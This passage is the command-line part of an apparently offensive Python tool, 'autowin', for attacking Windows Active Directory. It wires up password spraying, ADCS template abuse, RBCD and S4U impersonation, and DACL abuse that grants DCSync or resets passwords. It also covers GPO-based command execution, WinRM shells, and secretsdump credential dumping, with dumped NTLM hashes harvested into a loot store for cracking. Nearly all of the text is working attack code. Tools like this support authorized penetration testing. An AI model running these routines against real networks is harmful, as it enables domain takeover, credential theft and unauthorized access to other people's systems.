def gpo_cmd(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        _resolve_args_cred(store, args)
    finally:
        store.close()
    if not args.user or not args.password:
        err("gpo: need a user and password (-u/-p, or store a credential)")
        return
    if not args.domain:
        err("gpo: domain unknown (pass -d, or set a current user)")
        return
    _gpo.gpo_abuse(args.domain, args.user, args.password, args.gpo_id,
                   args.command, args.taskname)


def adcs_cmd(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        dc = resolve_target(args.dc, store, "DC")
        if dc is None:
            return
        cred = _resolve_args_cred(store, args, target=dc)
    finally:
        store.close()
    if not args.user or not args.password:
        if args.user and (getattr(args, "hash", None) or getattr(args, "kerberos", False)):
            err("adcs: this command needs a password (-p); hash/Kerberos isn't wired "
                "for the certipy path here")
        else:
            err("adcs: need a user and password (-u/-p, or store a credential)")
        return
    if not args.domain:
        err("adcs: domain unknown (pass -d, or set a current user)")
        return
    info(f"certipy ADCS on {dc} as {_auth_line(cred)}")
    _adcs.exploit(
        args.domain, dc, args.user, args.password, args.target or dc,
        esc=args.esc, ca=args.ca, template=args.template, upn=args.upn,
    )


def rbcd_cmd(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        dc = resolve_target(args.dc, store, "DC")
        if dc is None:
            return
        cred = _resolve_args_cred(store, args, target=dc)
    finally:
        store.close()
    if not args.user or not args.password:
        err("rbcd: need a user and password (-u/-p, or store a credential)")
        return
    if not args.domain:
        err("rbcd: domain unknown (pass -d, or set a current user)")
        return
    info(f"RBCD on {dc} as {_auth_line(cred)}")
    _delegation.rbcd(
        args.domain, dc, args.user, args.password, args.target,
        computer=args.computer, computer_pass=args.computer_pass,
        impersonate=args.impersonate, clean=args.clean,
    )


def shell_cmd(args: argparse.Namespace) -> None:
    """Drop into an interactive WinRM shell via evil-winrm-py."""
    if not have("evil-winrm-py"):
        err("shell: evil-winrm-py not found on PATH (pipx install evil-winrm-py)")
        return
    store = Store(args.loot_dir)
    try:
        target = resolve_target(args.target, store, "target")
        if target is None:
            return
        if not args.domain:
            args.domain = _resolve_smb_domain(store, target, args.user)
        cred = _resolve_args_cred(store, args, target=target)
    finally:
        store.close()
    if not cred.username:
        err("shell: no credential -- give -u (and it uses the stored secret), or "
            "store one with `config cred add`")
        return
    info(f"evil-winrm shell to {target} as {_auth_line(cred)}")
    cmd = ["evil-winrm-py", "-i", target, "-u", cred.username]
    if cred.kerberos:
        cmd += ["-k", "--no-pass"]
    elif cred.is_hash:
        cmd += ["-H", cred.secret]
    elif cred.secret:
        cmd += ["-p", cred.secret]
    else:
        cmd += ["--no-pass"]
    stream(*cmd)


_SECRET_LINE = re.compile(
    r'^(?:(?P<dom>[^\\/:]+)[\\/])?(?P<user>[^:]+):(?P<rid>\d+):'
    r'(?P<lm>[0-9a-fA-F]{32}):(?P<nt>[0-9a-fA-F]{32}):::'
)


def _harvest_secretsdump(store: Store, default_domain: str | None, output: str) -> int:
    """Fold `user:rid:lm:nt:::` lines from secretsdump into the store as NTLM
    credentials (+ the ntlm hash file), so they feed the crack/auth pipeline."""
    n = 0
    for line in output.splitlines():
        m = _SECRET_LINE.match(line.strip())
        if not m:
            continue
        domain = m.group("dom") or (default_domain or "")
        user, nt = m.group("user"), m.group("nt")
        if store.add_credential(domain, user, nt, is_hash=True, source="secretsdump"):
            n += 1
        store.add_user(domain, user)
        store.add_hash(domain, user, "ntlm", nt)
    return n


def secretsdump_cmd(args: argparse.Namespace) -> None:
    """Dump SAM/LSA/NTDS secrets from a host via impacket-secretsdump."""
    if not have("impacket-secretsdump"):
        err("secretsdump: impacket-secretsdump not found on PATH (install impacket)")
        return
    store = Store(args.loot_dir)
    try:
        target = resolve_target(args.target, store, "target")
        if target is None:
            return
        if not args.domain:
            args.domain = _resolve_smb_domain(store, target, args.user)
        cred = _resolve_args_cred(store, args, target=target)
        if not cred.username:
            err("secretsdump: no credential -- give -u (uses the stored secret), "
                "or store one with `config cred add`")
            return

        info(f"secretsdump on {target} as {_auth_line(cred)}")
        authority = f"{cred.domain}/{cred.username}" if cred.domain else cred.username
        cmd = ["impacket-secretsdump"]
        if cred.kerberos:
            cmd += ["-k", "-no-pass"]
            spec = f"{authority}@{target}"
        elif cred.is_hash:
            cmd += ["-hashes", cred.secret if ":" in cred.secret else f":{cred.secret}"]
            spec = f"{authority}@{target}"
        elif cred.secret:
            spec = f"{authority}:{cred.secret}@{target}"
        else:
            cmd += ["-no-pass"]
            spec = f"{authority}@{target}"
        if args.dc_ip:
            cmd += ["-dc-ip", args.dc_ip]

        # scope: default to just the domain Administrator; --all dumps everything
        is_dc = any(h["dc"] and target in (h["hostname"], h["ip"])
                    for h in store.list_hosts())
        if args.just_dc_user:
            cmd += ["-just-dc-user", args.just_dc_user]
        elif args.all:
            if is_dc:
                cmd += ["-just-dc"]           # every NTDS account
            info("dumping all secrets")
        elif is_dc:
            cmd += ["-just-dc-user", args.admin or "Administrator"]
            info(f"dumping only {args.admin or 'Administrator'} (use --all for everything)")
        else:
            # not a DC: no DCSync, so dump this box's local SAM/LSA secrets
            info("non-DC target: dumping local SAM/LSA secrets (use --all for everything)")
        cmd.append(spec)

        command("  " + " ".join(cmd))          # reproducible command
        lines: list[str] = []
        for line in run_stream(*cmd, timeout=args.timeout):
            plain("  " + line)
            lines.append(line)
        out = "\n".join(lines)
        store.save_output(cred.context(), f"secretsdump_{target}", " ".join(cmd), out)
        n = _harvest_secretsdump(store, cred.domain, out)
    finally:
        store.close()
    good(f"secretsdump complete; stored {n} NTLM credential(s) to the loot store")


# ---- argument parsing -------------------------------------------------


def read_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="autowin",
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = parser.add_subparsers(dest="command", required=True)

    d = sub.add_parser(
        "discover", help="automated AD vulnerability discovery (default)"
    )
    d.add_argument("ip_range", nargs="?",
                   help="IP, CIDR, a.b.c.d-e range, or list "
                        "(omit to run on the stored targets)")
    d.add_argument(
        "-t", "--threads", type=int, default=64, help="concurrent recon threads"
    )
    d.add_argument(
        "-w",
        "--wordlist",
        default="/usr/share/wordlists/rockyou.txt",
        help="wordlist for hashcat cracking",
    )
    d.add_argument(
        "--userlist",
        help="candidate username file to validate (kerbrute/netexec/nmap) and fold in",
    )
    d.add_argument(
        "-u", "--user",
        help="credential username for authenticated discovery (stored if new); "
             "with no -p/-H it selects an already-stored credential for that user",
    )
    dgrp = d.add_mutually_exclusive_group()
    dgrp.add_argument("-p", "--password", help="credential password")
    dgrp.add_argument("-H", "--hash", help="credential NTLM hash (LM:NT or just the NT hash)")
    d.add_argument(
        "-d", "--domain",
        help="credential domain (defaults to the discovered DC's domain)",
    )
    d.add_argument(
        "-k", "--kerberos", action="store_true",
        help="authenticate over Kerberos (uses the ccache in KRB5CCNAME when no secret is given)",
    )
    d.add_argument(
        "--loot-dir", default=DEFAULT_LOOT, help="persistent loot store directory"
    )
    # deprecated: discovery no longer runs in re-scan rounds (re-run discover
    # with a credential instead). Accepted silently so old commands don't break.
    d.add_argument("--max-rounds", type=int, default=1, help=argparse.SUPPRESS)
    d.add_argument(
        "--exclude",
        default="",
        help="hosts to skip (IP/CIDR/range/list), e.g. a jumpbox",
    )
    d.add_argument(
        "--rescan",
        action="store_true",
        help="force a fresh network scan even if this range was scanned before",
    )
    d.add_argument("--vulns", action="store_true",
                   help="only run the NetExec vuln/CVE/loot module sweep (with the "
                        "chosen credential) and skip all other enumeration")
    d.add_argument("--no-crack", action="store_true", help="skip hashcat cracking")
    d.add_argument(
        "--timeroast", action="store_true", help="also timeroast computer accounts"
    )
    d.set_defaults(func=discover)

    s = sub.add_parser(
        "spray", help="password-spray and/or validate stored/listed users"
    )
    s.add_argument("dc", nargs="?",
                   help="DC/host to authenticate against (default: stored target)")
    s.add_argument("-d", "--domain", required=True)
    s.add_argument(
        "--users", help="username list file (default: stored users for the domain)"
    )
    s.add_argument(
        "--validate-users",
        action="store_true",
        help="kerbrute-style check (via NetExec) of which users exist; valid "
        "users are stored (no password) and spraying is narrowed to them",
    )
    s.add_argument("-p", "--password", help="a single password to try")
    s.add_argument("--passwords", help="password list file")
    s.add_argument(
        "--password-equals-username",
        action="store_true",
        help="try password == username for each user",
    )
    s.add_argument("--loot-dir", default=DEFAULT_LOOT)
    s.set_defaults(func=spray_cmd)

    # --- config: manage stored state (creds, hosts, and engagement transfer) ---
    cfg = sub.add_parser("config", help="manage stored creds / hosts / export-import")
    cfgsub = cfg.add_subparsers(dest="config_cmd", required=True)

    c = cfgsub.add_parser("cred", help="manage the persistent credential store")
    csub = c.add_subparsers(dest="cred_cmd", required=True)
    ca = csub.add_parser("add", help="add a credential you found elsewhere")
    ca.add_argument("-d", "--domain", required=True)
    ca.add_argument("-u", "--user", required=True)
    grp = ca.add_mutually_exclusive_group(required=True)
    grp.add_argument("-p", "--password")
    grp.add_argument("-H", "--hash", help="NTLM hash")
    ca.add_argument("--host", default="", help="host it is valid on / to verify against")
    ca.add_argument("-k", "--kerberos", action="store_true",
                    help="mark it a Kerberos credential (every op using it will auth with -k)")
    ca.add_argument("-f", "--force", action="store_true",
                    help="store without verifying the credential or checking for shell access")
    ca.add_argument("--loot-dir", default=DEFAULT_LOOT)
    ca.set_defaults(func=cred_add)
    cl = csub.add_parser("list", help="list stored credentials")
    cl.add_argument("-d", "--domain", help="filter by domain")
    cl.add_argument(
        "--all",
        action="store_true",
        help="also list known users we have no credential for (e.g. kerbrute-validated)",
    )
    cl.add_argument("--loot-dir", default=DEFAULT_LOOT)
    cl.set_defaults(func=cred_list)

    cr = csub.add_parser("rm", help="remove stored credential(s) for a user")
    cr.add_argument("-u", "--user", required=True)
    cr.add_argument("-d", "--domain", help="restrict to this domain")
    cr_sec = cr.add_mutually_exclusive_group()
    cr_sec.add_argument("-p", "--password", help="only remove this exact password")
    cr_sec.add_argument("-H", "--hash", help="only remove this exact NTLM hash")
    cr.add_argument("--loot-dir", default=DEFAULT_LOOT)
    cr.set_defaults(func=cred_rm)

    cu = cfgsub.add_parser(
        "current-user",
        help="show / set / clear the credential discover uses by default",
    )
    cu.add_argument("user", nargs="?", help=r"DOMAIN\user to pin (omit to show the current one)")
    cu.add_argument("-d", "--domain", help="domain (if not given as DOMAIN\\user)")
    cu.add_argument("-u", "--user", dest="user_opt", help="username (alternative to the positional)")
    cu.add_argument("-k", "--kerberos", action="store_true", help="mark it as a Kerberos login")
    cu.add_argument("--clear", action="store_true", help="unset the current user")
    cu.add_argument("--loot-dir", default=DEFAULT_LOOT)
    cu.set_defaults(func=current_user_cmd)

    # --- exploit: opt-in, one exploit on demand (never run automatically) -----
    exp = sub.add_parser("exploit", help="run a single exploit on demand (adcs / rbcd / gpo)")
    expsub = exp.add_subparsers(dest="exploit_cmd", required=True)

    a = expsub.add_parser("adcs", help="abuse a vulnerable ADCS template (ESCx)")
    a.add_argument("dc", nargs="?", help="domain controller IP (default: stored target)")
    a.add_argument("-u", "--user", help="username (stored secret used if -p omitted)")
    a.add_argument("-p", "--password")
    a.add_argument("-d", "--domain")
    a.add_argument("--target", help="enrollment target (CA host); defaults to the DC")
    a.add_argument(
        "--esc", help="ESC class to abuse (ESC1/2/3/4/6); auto-detect if omitted"
    )
    a.add_argument("--ca", help="CA name (auto-detected if omitted)")
    a.add_argument("--template", help="template name (auto-detected if omitted)")
    a.add_argument("--upn", default="administrator", help="account to impersonate")
    a.add_argument("--loot-dir", default=DEFAULT_LOOT)
    a.set_defaults(func=adcs_cmd)

    r = expsub.add_parser("rbcd", help="resource-based constrained delegation")
    r.add_argument("dc", nargs="?", help="domain controller IP/host (default: stored target)")
    r.add_argument("-u", "--user", help="username (stored secret used if -p omitted)")
    r.add_argument("-p", "--password")
    r.add_argument("-d", "--domain")
    r.add_argument("--target", required=True, help="victim computer (delegate-to)")
    r.add_argument("--impersonate", default="Administrator")
    r.add_argument(
        "--computer", default="autowin$", help="attacker computer account to create"
    )
    r.add_argument("--computer-pass", default="Autowin123!")
    r.add_argument("--clean", action="store_true", help="undo a previous run")
    r.add_argument("--loot-dir", default=DEFAULT_LOOT)
    r.set_defaults(func=rbcd_cmd)

    g = expsub.add_parser(
        "gpo", help="code execution via an editable GPO (pyGPOAbuse)"
    )
    g.add_argument("-u", "--user", help="username (stored secret used if -p omitted)")
    g.add_argument("-p", "--password")
    g.add_argument("-d", "--domain")
    g.add_argument("--gpo-id", required=True, help="GUID of the GPO to abuse")
    g.add_argument(
        "--command", required=True, help="PowerShell command to run in the GPO scope"
    )
    g.add_argument("--taskname", default="AutoWinTask")
    g.add_argument("--loot-dir", default=DEFAULT_LOOT)
    g.set_defaults(func=gpo_cmd)

    # exploit s4u: constrained-delegation impersonation (impacket getST)
    su = expsub.add_parser("s4u", help="constrained delegation: impersonate a user to an SPN")
    su.add_argument("-u", "--user", help="the delegation-enabled principal (stored secret used if no secret given)")
    su_sec = su.add_mutually_exclusive_group()
    su_sec.add_argument("-p", "--password")
    su_sec.add_argument("-H", "--hash", help="NTLM hash")
    su_sec.add_argument("--aes", help="AES key")
    su.add_argument("-d", "--domain")
    su.add_argument("--spn", required=True, help="target SPN, e.g. cifs/host.corp.local")
    su.add_argument("--impersonate", default="Administrator", help="user to impersonate")
    su.add_argument("--dc-ip")
    su.add_argument("--loot-dir", default=DEFAULT_LOOT)
    su.set_defaults(func=s4u_cmd)

    # exploit dacl: ACL abuse suite via bloodyAD
    dc = expsub.add_parser("dacl", help="ACL abuse via bloodyAD (dcsync / genericall / ...)")
    dcsub = dc.add_subparsers(dest="dacl_cmd", required=True)

    def _dacl_auth(p: argparse.ArgumentParser) -> None:
        p.add_argument("-u", "--user", help="username (stored secret used if -p/-H omitted)")
        g2 = p.add_mutually_exclusive_group()
        g2.add_argument("-p", "--password")
        g2.add_argument("-H", "--hash", help="NTLM hash")
        p.add_argument("-k", "--kerberos", action="store_true", help="Kerberos (needs KRB5CCNAME)")
        p.add_argument("-d", "--domain")
        p.add_argument("--dc", help="DC host to write to (default: stored target)")
        p.add_argument("--dc-ip", help="DC IP (helps when --dc is a hostname)")
        p.add_argument("--loot-dir", default=DEFAULT_LOOT)

    dd = dcsub.add_parser("dcsync", help="grant a trustee DCSync on the domain")
    _dacl_auth(dd)
    dd.add_argument("--trustee", help="who gets DCSync (default: the auth user)")
    dd.set_defaults(func=dacl_cmd)

    dg = dcsub.add_parser("genericall", help="grant a trustee GenericAll over a target")
    _dacl_auth(dg)
    dg.add_argument("--target", required=True, help="object to control")
    dg.add_argument("--trustee", help="who gets control (default: the auth user)")
    dg.set_defaults(func=dacl_cmd)

    dm = dcsub.add_parser("addmember", help="add a member to a group")
    _dacl_auth(dm)
    dm.add_argument("--group", required=True)
    dm.add_argument("--member", help="who to add (default: the auth user)")
    dm.set_defaults(func=dacl_cmd)

    dp = dcsub.add_parser("setpassword", help="reset a user's password")
    _dacl_auth(dp)
    dp.add_argument("--target", required=True, help="user whose password to set")
    dp.add_argument("--new-password", required=True)
    dp.set_defaults(func=dacl_cmd)

    do = dcsub.add_parser("setowner", help="take ownership of an object")
    _dacl_auth(do)
    do.add_argument("--target", required=True)
    do.add_argument("--owner", help="new owner (default: the auth user)")
    do.set_defaults(func=dacl_cmd)

    # exploit shell: interactive WinRM shell via evil-winrm-py
    esh = expsub.add_parser("shell", help="interactive WinRM shell (evil-winrm-py)")
    esh.add_argument("target", nargs="?", help="target host (default: stored target)")
    esh.add_argument("-u", "--user", help="username (stored secret used if -p/-H omitted)")
    esh_sec = esh.add_mutually_exclusive_group()
    esh_sec.add_argument("-p", "--password")
    esh_sec.add_argument("-H", "--hash", help="NTLM hash")
    esh.add_argument("-d", "--domain")
    # no -k here: Kerberos is a property of the credential (mark it with
    # `config cred add -k` or `discover -k`); the shell inherits it from the store
    esh.add_argument("--loot-dir", default=DEFAULT_LOOT)
    esh.set_defaults(func=shell_cmd)

    # exploit secretsdump: SAM / LSA / NTDS secrets via impacket-secretsdump
    sdp = expsub.add_parser("secretsdump",
                            help="dump SAM/LSA/NTDS secrets (impacket-secretsdump)")
    sdp.add_argument("target", nargs="?",
                     help="host to dump (default: stored target; use the DC with --just-dc)")
    sdp.add_argument("-u", "--user", help="username (stored secret used if -p/-H omitted)")
    sdp_sec = sdp.add_mutually_exclusive_group()
    sdp_sec.add_argument("-p", "--password")
    sdp_sec.add_argument("-H", "--hash", help="NTLM hash")
    sdp.add_argument("-d", "--domain")
    sdp.add_argument("-k", "--kerberos", action="store_true",
                     help="Kerberos auth (uses the ccache in KRB5CCNAME)")
    sdp.add_argument("--dc-ip", help="DC IP (for -k or a hostname target)")
    sdp.add_argument("--all", action="store_true",
                     help="dump everything (all NTDS accounts on a DC); default is just Administrator")
    sdp.add_argument("--admin", default="Administrator",
                     help="the single account to dump by default (default: Administrator)")
    sdp.add_argument("--just-dc-user", help="dump only this specific account (overrides --all)")
    sdp.add_argument("--timeout", type=int, default=600, help="seconds before giving up")
    sdp.add_argument("--loot-dir", default=DEFAULT_LOOT)
    sdp.set_defaults(func=secretsdump_cmd)

    # --- smb: interact with SMB services (list / shell / recursive download) ---
    sm = sub.add_parser(
        "smb", help="[manual] interact with SMB: shares, shell, download"
    )
    smsub = sm.add_subparsers(dest="smb_cmd", required=True)

    def _smb_auth(p: argparse.ArgumentParser) -> None:
        p.add_argument("target", nargs="?",
                       help="target host (name or IP); default: stored target")
        p.add_argument("-u", "--user",
                       help="username; if it's in the cred store you can omit -p/-H "
                            "(the stored secret is used). Omit entirely to use the "
                            "current user / best stored credential")
        secret = p.add_mutually_exclusive_group()
        secret.add_argument("-p", "--password", help="password")
        secret.add_argument("-H", "--hash", help="NTLM hash")
        secret.add_argument("-N", "--null", action="store_true",
                            help="force an anonymous / null session (ignore stored creds)")
        p.add_argument("-d", "--domain", help="domain (default: local/workgroup)")
        p.add_argument(
            "-k",
            "--kerberos",
            action="store_true",
            help="use Kerberos auth (needs a ccache in KRB5CCNAME)",
        )
        p.add_argument("--dc-ip", help="KDC / connect IP (for -k or a hostname target)")
        p.add_argument("--loot-dir", default=DEFAULT_LOOT)

    sl = smsub.add_parser("shares", help="list shares on the target")
    _smb_auth(sl)
    sl.set_defaults(func=smb_cmd)

    ss = smsub.add_parser("shell", help="interactive SMB shell (impacket-smbclient)")
    _smb_auth(ss)
    ss.set_defaults(func=smb_cmd)

    sd = smsub.add_parser("download", help="recursively download a whole share")
    _smb_auth(sd)
    sd.add_argument("share", help="share name to download (e.g. SYSVOL)")
    sd.add_argument(
        "-o", "--output", default=".", help="local directory to download into"
    )
    sd.set_defaults(func=smb_cmd)

    # --- host: manage the target list and /etc/hosts ------------------------
    h = cfgsub.add_parser("host", help="manage known hosts / the default target")
    hsub = h.add_subparsers(dest="host_cmd", required=True)

    hl = hsub.add_parser("list", help="list known hosts (ip, hostname, domain)")
    hl.add_argument("--loot-dir", default=DEFAULT_LOOT)
    hl.set_defaults(func=host_cmd)

    ha = hsub.add_parser("add", help="manually add a target host")
    ha.add_argument("ip", help="host IP")
    ha.add_argument("--hostname", help="hostname (defaults to the IP)")
    ha.add_argument("-d", "--domain", help="domain")
    ha.add_argument("--dc", action="store_true", help="mark this host as a domain controller")
    ha.add_argument("--loot-dir", default=DEFAULT_LOOT)
    ha.set_defaults(func=host_cmd)

    hr = hsub.add_parser("rm", help="remove a host by hostname or IP")
    hr.add_argument("target", help="hostname or IP to remove")
    hr.add_argument("--loot-dir", default=DEFAULT_LOOT)
    hr.set_defaults(func=host_cmd)

    hd = hsub.add_parser("default", help="show or set the default target")
    hd.add_argument("target", nargs="?", help="hostname/IP to set as default (omit to show)")
    hd.add_argument("--loot-dir", default=DEFAULT_LOOT)
    hd.set_defaults(func=host_cmd)

    hsy = hsub.add_parser("sync", help="append known hosts to /etc/hosts")
    hsy.add_argument("--loot-dir", default=DEFAULT_LOOT)
    hsy.set_defaults(func=host_cmd)

    # --- ticket: request a Kerberos TGT (ccache) --------------------------
    t = sub.add_parser("ticket", help="request a Kerberos TGT and print the KRB5CCNAME to use")
    t.add_argument("-u", "--user", help="username (stored secret used if no secret given)")
    tsecret = t.add_mutually_exclusive_group()
    tsecret.add_argument("-p", "--password")
    tsecret.add_argument("-H", "--hash", help="NTLM hash")
    tsecret.add_argument("--aes", help="AES128/256 key")
    t.add_argument("-d", "--domain")
    t.add_argument("--dc-ip", help="KDC IP (recommended)")
    t.add_argument("--loot-dir", default=DEFAULT_LOOT)
    t.set_defaults(func=ticket_cmd)

    # --- export / import: move a whole engagement between operators ---------
    ex = cfgsub.add_parser("export", help="bundle the loot store into a shareable .zip")
    ex.add_argument("-o", "--output", help="output .zip path (default: autowin-export-<ts>.zip)")
    ex.add_argument("--include-logs", action="store_true", help="also bundle the logs/ directory")
    ex.add_argument("--loot-dir", default=DEFAULT_LOOT)
    ex.set_defaults(func=export_cmd)

    im = cfgsub.add_parser("import", help="merge an exported .zip into the local loot store")
    im.add_argument("file", help="the .zip produced by `autowin export`")
    im.add_argument("--loot-dir", default=DEFAULT_LOOT)
    im.set_defaults(func=import_cmd)

    lg = cfgsub.add_parser("logs", help="list / tail / follow the run logs")
    lgm = lg.add_mutually_exclusive_group()
    lgm.add_argument("--tail", nargs="?", const=40, type=int, metavar="N",
                     help="print the last N lines of the latest log (default 40)")
    lgm.add_argument("-f", "--follow", action="store_true", help="follow the latest log live")
    lgm.add_argument("--path", action="store_true", help="print the latest log file path only")
    lg.add_argument("--loot-dir", default=DEFAULT_LOOT)
    lg.set_defaults(func=logs_cmd)

    # allow `autowin <ip_range>` as shorthand for `autowin discover <ip_range>`
    argv = sys.argv[1:]
    if argv and argv[0] not in SUBCOMMANDS and argv[0] not in ("-h", "--help"):
        argv = ["discover"] + argv

    return parser.parse_args(argv)


def main() -> None:
    args = read_args()
    # logging is on by default; it lives alongside the loot store (so by
    # default ~/.autowin/logs), following --loot-dir when one is given.
    loot = getattr(args, "loot_dir", DEFAULT_LOOT)
    path = start_logging(os.path.join(loot, "logs"))
    if path:
        # to stderr so it never pollutes stdout (e.g. `config logs --path`)
        print(f"[*] logging to {path}", file=sys.stderr)
    args.func(args)


if __name__ == "__main__":
    main()
